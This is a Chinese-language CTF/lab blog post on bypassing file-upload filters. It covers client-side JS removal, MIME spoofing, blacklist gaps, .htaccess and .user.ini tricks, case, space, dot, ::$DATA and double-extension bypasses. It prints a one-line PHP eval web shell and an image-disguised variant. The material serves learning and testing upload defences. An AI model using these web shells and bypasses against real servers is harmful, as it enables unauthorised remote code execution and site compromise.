<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Echo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Echo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="GOGOGO">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Echo</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-10 20:53:21" itemprop="dateCreated datePublished" datetime="2022-03-10T20:53:21+08:00">2022-03-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-06 20:38:18" itemprop="dateModified" datetime="2022-05-06T20:38:18+08:00">2022-05-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>5.1k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-绕过JS验证"><a href="#0x01-绕过JS验证" class="headerlink" title="0x01 绕过JS验证"></a>0x01 绕过JS验证</h2><p>客户端验证</p>
<p>1、使用burpsuite remove JS</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310205505176.png" alt="image-20220310205505176"></p>
<p>2、利用浏览器的审查工具剔除JS后，保存为新文件，添加action后进行再文件上传</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310205810236.png" alt="image-20220310205810236"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310205845186.png" alt="image-20220310205845186"></p>
<p>3、绕过JS后用蚁剑连接</p>
<p>一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-绕过MIME-Type验证"><a href="#0x02-绕过MIME-Type验证" class="headerlink" title="0x02 绕过MIME-Type验证"></a>0x02 绕过MIME-Type验证</h2><h3 id="1、MIME-Type介绍"><a href="#1、MIME-Type介绍" class="headerlink" title="1、MIME-Type介绍"></a>1、MIME-Type介绍</h3><p>MIME(Multipurpose Intemnet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名（jpg,png…)的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 image/png …<br>例如:<img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310211629472.png" alt="image-20220310211629472"></p>
<h3 id="2、验证mime-type代码分析"><a href="#2、验证mime-type代码分析" class="headerlink" title="2、验证mime-type代码分析"></a>2、验证mime-type代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310211832876.png" alt="image-20220310211832876"></p>
<p>非客户端验证，而是服务端验证</p>
<h3 id="3、burpsuite绕过mime-type验证"><a href="#3、burpsuite绕过mime-type验证" class="headerlink" title="3、burpsuite绕过mime-type验证"></a>3、burpsuite绕过mime-type验证</h3><p>利用Burpsuite工具截断HTTP请求，在Repeater重放修改MIME-Type类型绕过验证。image/jpeg</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310212940612.png" alt="image-20220310212940612"></p>
<p>修改第二个content-type，可以直接在bp proxy修改,再forward</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310213327424.png" alt="image-20220310213327424"></p>
<h3 id="4、蚁剑连接-虚拟终端介绍"><a href="#4、蚁剑连接-虚拟终端介绍" class="headerlink" title="4、蚁剑连接 虚拟终端介绍"></a>4、蚁剑连接 虚拟终端介绍</h3><p>蚁剑右键虚拟终端，可执行终端命令</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310213559781.png" alt="image-20220310213559781"></p>
<h2 id="0x03-绕过黑名单验证"><a href="#0x03-绕过黑名单验证" class="headerlink" title="0x03 绕过黑名单验证"></a>0x03 绕过黑名单验证</h2><h3 id="1、基于文件后缀名验证介绍-服务端"><a href="#1、基于文件后缀名验证介绍-服务端" class="headerlink" title="1、基于文件后缀名验证介绍       -服务端"></a>1、基于文件后缀名验证介绍       -服务端</h3><p>对于文件上传模块来说，尽量避免上传可执行的脚本文件（php,asp,jsp)。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证。</p>
<p>基于文件后缀名验证方式的分类:<br>1、基于白名单验证:只针对白名单中有的后缀名，文件才能上传成功。<br>2、基于黑名单验证:只针对黑名单中没有的后缀名，文件才能上传成功。</p>
<h3 id="2、基于黑名单验证代码分析"><a href="#2、基于黑名单验证代码分析" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h3><p>对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同时也不在黑名单中。</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310214903554.png" alt="image-20220310214903554"></p>
<h3 id="3、burpsuite绕过黑名单验证"><a href="#3、burpsuite绕过黑名单验证" class="headerlink" title="3、burpsuite绕过黑名单验证"></a>3、burpsuite绕过黑名单验证</h3><p>利用Burpsuite工具截断HTTP请求，利用Intruder模块进行枚举后缀名，寻找黑名单中没有过滤的后缀名。   (php,php3,php4,phtml,.phps .php5 .pht)</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310215001030.png" alt="image-20220310215001030"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310215842412.png" alt="image-20220310215842412"></p>
<p>php3,php4,phtml,均上传成功，右键<img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310215929101.png" alt="image-20220310215929101"></p>
<h3 id="4、蚁剑连接"><a href="#4、蚁剑连接" class="headerlink" title="4、蚁剑连接"></a>4、蚁剑连接</h3><h2 id="0x04-绕过黑名单验证（-htaccess-user-ini"><a href="#0x04-绕过黑名单验证（-htaccess-user-ini" class="headerlink" title="0x04 绕过黑名单验证（.htaccess   .user.ini)"></a>0x04 绕过黑名单验证（.htaccess   .user.ini)</h2><h3 id="1、-htaccess文件介绍"><a href="#1、-htaccess文件介绍" class="headerlink" title="1、.htaccess文件介绍"></a>1、.htaccess文件介绍</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>其中.htaccess文件内容<br>SetHandler application/x-httpd-php<br>设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。</p>
<h3 id="2、配置文件http-conf"><a href="#2、配置文件http-conf" class="headerlink" title="2、配置文件http.conf"></a>2、配置文件http.conf</h3><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310221655835.png" alt="image-20220310221655835"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310221908695.png" alt="image-20220310221908695"></p>
<h3 id="3、审计黑名单过滤代码"><a href="#3、审计黑名单过滤代码" class="headerlink" title="3、审计黑名单过滤代码"></a>3、审计黑名单过滤代码</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310222352663.png" alt="image-20220310222352663"></p>
<p>黑名单中是否有.htaccess</p>
<p>在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来设置使用php解析任意文件。文件内容:SetHandler application/x-httpd-php</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;4.png&quot;</span>&gt;</span></span><br><span class="line"> <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p> 这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php，把这个文件上传上去。</p>
<h3 id="4、制作图片phpinfo探针并上传"><a href="#4、制作图片phpinfo探针并上传" class="headerlink" title="4、制作图片phpinfo探针并上传"></a>4、制作图片phpinfo探针并上传</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310222944938.png" alt="image-20220310222944938"></p>
<h3 id="5、-user-ini"><a href="#5、-user-ini" class="headerlink" title="5、.user.ini"></a>5、.user.ini</h3><p>首先介绍php.ini文件，php有很多配置，并可以在php.ini中设置。在每个正规的网站里，都会由这样一个文件，而且每次运行PHP文件时，都会去读取这个配置文件，来设置PHP的相关规则。<br> 这些配置可以分为四种：</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311165637947.png" alt="image-20220311165637947"></p>
<p>我感觉是按重要程度分类了，比如关乎到系统一类的配置，那一类的全部配置，都属于“PHP_INI_SYSTEM”。它只能在，像php.ini这样的“厉害”的文件里可以设定。而其他的三类不怎么重要的配置，除了可以在php.ini中设定外，还可以在其它类似的文件中设定，其中就包括.user.ini文件。</p>
<p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。.user.ini.它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。</p>
<p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>其中有两个配置，可以用来制造后门：<br> auto_append_file、auto_prepend_file<br> 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=test.jpg</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_append_file</span>=test.jpg</span><br></pre></td></tr></table></figure>

<p>然后将图片马传上去，再访问index.php,注意是上传目录下的index.php，执行任意命令即可，也可蚁剑连接</p>
<p>实例：上传.user.ini绕过黑名单检验                                                                                                                                                                                                                                                                                                                               </p>
<pre><code>GIF89a              //绕过exif_imagetype():判断一个图像的类型
auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。
auto_append_file=a.jpg  //解析后进行包含
</code></pre>
<p>优势：跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache</p>
<p>操作</p>
<p>首先，构造一个.user.ini文件，内容如下：</p>
<pre><code>GIF89a                 
auto_prepend_file=a.jpg 
</code></pre>
<p>然后构造一个a.jpg，内容如下：</p>
<pre><code>GIF89a
&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;
</code></pre>
<p>然后将两个文件分别上传到服务器上，拿到回显。</p>
<h2 id="0x05-绕过黑名单之大小写绕过"><a href="#0x05-绕过黑名单之大小写绕过" class="headerlink" title="0x05 绕过黑名单之大小写绕过"></a>0x05 绕过黑名单之大小写绕过</h2><h3 id="1、大小写绕过原理"><a href="#1、大小写绕过原理" class="headerlink" title="1、大小写绕过原理"></a>1、大小写绕过原理</h3><p>Windows系统下，对于文件名中的大小写不敏感。例如:test.php和TeSt.PHP是一样的。</p>
<p>Linux系统下，对于文件名中的大小写敏感。例如:(test.php和TesT.php就是不一样的。</p>
<h3 id="2、基于黑名单验证代码分析-1"><a href="#2、基于黑名单验证代码分析-1" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310225004056.png" alt="image-20220310225004056"></p>
<p>可以清晰的看出，黑名单中增加了.htaccess的验证，但是缺少了对上传文件名获取的小写转换。</p>
<p>没有进行大小写完全一致的过滤</p>
<p>先完全小写或完全大写上传与黑名单进行比较，找漏网之鱼</p>
<h3 id="3、直接修改后缀名PhP上传文件"><a href="#3、直接修改后缀名PhP上传文件" class="headerlink" title="3、直接修改后缀名PhP上传文件"></a>3、直接修改后缀名PhP上传文件</h3><p>文件后缀名不一定必须在Burpsutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传。</p>
<h3 id="4、webacoo生成webshell上传-kali"><a href="#4、webacoo生成webshell上传-kali" class="headerlink" title="4、webacoo生成webshell上传   -kali"></a>4、webacoo生成webshell上传   -kali</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310225911191.png" alt="image-20220310225911191"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310230040400.png" alt="image-20220310230040400"></p>
<p>127.0.0.1改为本机ip</p>
<h2 id="0x05-空格绕过"><a href="#0x05-空格绕过" class="headerlink" title="0x05 空格绕过"></a>0x05 空格绕过</h2><h3 id="1、空格绕过原理"><a href="#1、空格绕过原理" class="headerlink" title="1、空格绕过原理"></a>1、空格绕过原理</h3><p><strong>Windows系统</strong>下，对于文件名中空格（文件扩展名后的空格）会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单。<br>针对这样的情况需要使用Burpsuite阶段HTTP请求之后，修改对应的文件名添加空格。</p>
<h3 id="2、基于黑名单验证代码分析-2"><a href="#2、基于黑名单验证代码分析-2" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h3><p>经过代码分析可以看到代码中没有对上传文件的文件名做去空格处理。存在添加空格绕过黑名单问题。  去空用trim函数 </p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310230757898.png" alt="image-20220310230757898"></p>
<h3 id="3、bp绕过黑名单验证"><a href="#3、bp绕过黑名单验证" class="headerlink" title="3、bp绕过黑名单验证"></a>3、bp绕过黑名单验证</h3><p>利用Burpsuite工具截断HTTP请求,对上传的文件名后加空格。</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310231546140.png" alt="image-20220310231546140"></p>
<h3 id="4、webshell生成与上传"><a href="#4、webshell生成与上传" class="headerlink" title="4、webshell生成与上传"></a>4、webshell生成与上传</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220310231907777.png" alt="image-20220310231907777"></p>
<h2 id="0x06-“-”绕过"><a href="#0x06-“-”绕过" class="headerlink" title="0x06 “.”绕过"></a>0x06 “.”绕过</h2><h3 id="1、绕过原理-windows"><a href="#1、绕过原理-windows" class="headerlink" title="1、绕过原理   windows"></a>1、绕过原理   windows</h3><p>Windows系统下，文件后缀名最后一个点会被自动去除。<br>例如:<br>Windows下新建一个1.php.文件,查看。</p>
<h3 id="2、基于黑名单验证代码分析-3"><a href="#2、基于黑名单验证代码分析-3" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311144841248.png" alt="image-20220311144841248"></p>
<h3 id="3、bp绕过黑名单验证-1"><a href="#3、bp绕过黑名单验证-1" class="headerlink" title="3、bp绕过黑名单验证"></a>3、bp绕过黑名单验证</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311145021298.png" alt="image-20220311145021298"></p>
<h3 id="4、生成并上传webshell"><a href="#4、生成并上传webshell" class="headerlink" title="4、生成并上传webshell"></a>4、生成并上传webshell</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311145643115.png" alt="image-20220311145643115"></p>
<h2 id="0x07-特殊符号绕过"><a href="#0x07-特殊符号绕过" class="headerlink" title="0x07  特殊符号绕过"></a>0x07  特殊符号绕过</h2><h3 id="1、特殊符号绕过原理"><a href="#1、特殊符号绕过原理" class="headerlink" title="1、特殊符号绕过原理"></a>1、特殊符号绕过原理</h3><p>Windows系统下，如果上传的文件名中test.php.:$DATA(ADSNTFS文件系统所具有的一种格式，一种数据流）会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。</p>
<p>例如:<br>在Windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中包含特殊符号不能成功新建。</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311151610517.png" alt="image-20220311151610517"></p>
<h3 id="2、基于黑名单验证代码分析-4"><a href="#2、基于黑名单验证代码分析-4" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311151641346.png" alt="image-20220311151641346"></p>
<h3 id="3、直接上传1-php-DATA"><a href="#3、直接上传1-php-DATA" class="headerlink" title="3、直接上传1.php::$DATA"></a>3、直接上传1.php::$DATA</h3><p>Windows下不能直接创建，Linux可以</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311152148693.png" alt="image-20220311152148693"></p>
<p>访问的时候将::$DATA去掉</p>
<h3 id="4、上传第三方webshell"><a href="#4、上传第三方webshell" class="headerlink" title="4、上传第三方webshell"></a>4、上传第三方webshell</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311152444660.png" alt="image-20220311152444660"></p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311152601295.png" alt="image-20220311152601295"></p>
<h2 id="0x08-路径拼接绕过"><a href="#0x08-路径拼接绕过" class="headerlink" title="0x08 路径拼接绕过"></a>0x08 路径拼接绕过</h2><h3 id="1、绕过原理"><a href="#1、绕过原理" class="headerlink" title="1、绕过原理"></a>1、绕过原理</h3><p>在没有对上传的文件进行重命名的情况下，用户可以自定义文件名并在服务器中上传新建，就会造成对应的绕过黑名单。<br>例如:<br>用户新建1.php.+空格+.<br>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。利用Windows自动去除最后一个点，导致成功上传1.php。</p>
<h3 id="2、代码分析"><a href="#2、代码分析" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311153046450.png" alt="image-20220311153046450"></p>
<h3 id="3、修改文件名，绕过黑名单验证"><a href="#3、修改文件名，绕过黑名单验证" class="headerlink" title="3、修改文件名，绕过黑名单验证"></a>3、修改文件名，绕过黑名单验证</h3><p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311153116588.png" alt="image-20220311153116588"></p>
<p>适用于Windows</p>
<h3 id="4、上传小webshell，大webshell"><a href="#4、上传小webshell，大webshell" class="headerlink" title="4、上传小webshell，大webshell"></a>4、上传小webshell，大webshell</h3><p>上传小Webshell，以绕过上传过程中对文件大小等限制，从而能够更加有效上传大Webshell。</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311153341980.png" alt="image-20220311153341980"></p>
<h2 id="0x09-双写绕过"><a href="#0x09-双写绕过" class="headerlink" title="0x09 双写绕过"></a>0x09 双写绕过</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>代码编写过程中，只对黑名单中的内容进行空替换,因为只替换一次所以造成双写绕过。<br>例如:<br>1.phphpp</p>
<p><img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311154508083.png" alt="image-20220311154508083"></p>
<h3 id="2、代码分析-1"><a href="#2、代码分析-1" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><p>str_ireplace()函数替换字符串中的一些字符（不区分大小写）。该函数必须遵循下列规则:<br>如果搜索的字符串是一个数组，那么它将返回一个数组。<br>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。<br>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换<br>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。注释;该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。<br>注释:该函数是二进制安全的。</p>
<h3 id="3、绕过黑名单验证"><a href="#3、绕过黑名单验证" class="headerlink" title="3、绕过黑名单验证"></a>3、绕过黑名单验证</h3><p> <img src="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220311155254488.png" alt="image-20220311155254488"></p>
<h3 id="4、上传webshell"><a href="#4、上传webshell" class="headerlink" title="4、上传webshell"></a>4、上传webshell</h3><p>解决大马上传时单引号双引号被转义</p>
